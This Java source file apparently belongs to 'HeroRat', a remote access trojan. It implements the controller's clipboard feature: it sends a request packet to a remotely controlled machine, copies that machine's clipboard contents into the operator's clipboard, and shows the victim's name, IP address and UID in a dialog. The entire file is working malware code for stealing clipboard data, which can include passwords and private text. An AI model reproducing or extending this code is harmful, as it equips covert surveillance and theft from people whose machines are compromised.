package net.herorat.features.clipboard;

import java.awt.Toolkit;
import java.awt.datatransfer.StringSelection;

import javax.swing.JOptionPane;

import net.herorat.features.servers.Server;
import net.herorat.network.Packet;
import net.herorat.network.Packet15Clipboard;


public class Clipboard
{
	public static void send(Server server)
	{
		Packet p = new Packet15Clipboard(server.outputstream, new String[] { });
		p.write();
	}
	
	public static void handle(Server server, String[] args)
	{
		if (args.length == 1 && args[0].equals(""))
		{
			String message_content = "Failed to get the clipboard of\n" + server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")\nIt could be empty!";
			JOptionPane.showOptionDialog(null, message_content, "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE, null, (Object[]) null, (Object) null);
		}
		else if (args.length > 0)
		{
			StringBuffer buffer = new StringBuffer();
			for (String arg : args)
			{
				buffer.append(arg);
			}
			
			Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(buffer.toString()), null);
			
			String message_content = "The clipboard has been copied into yours\n" + server.getServerName() + " @ " + server.getIp() + " (UID: " + server.getUid().toUpperCase() + ")";
			JOptionPane.showOptionDialog(null, message_content, "Success", JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE, null, (Object[]) null, (Object) null);
		}
	}
}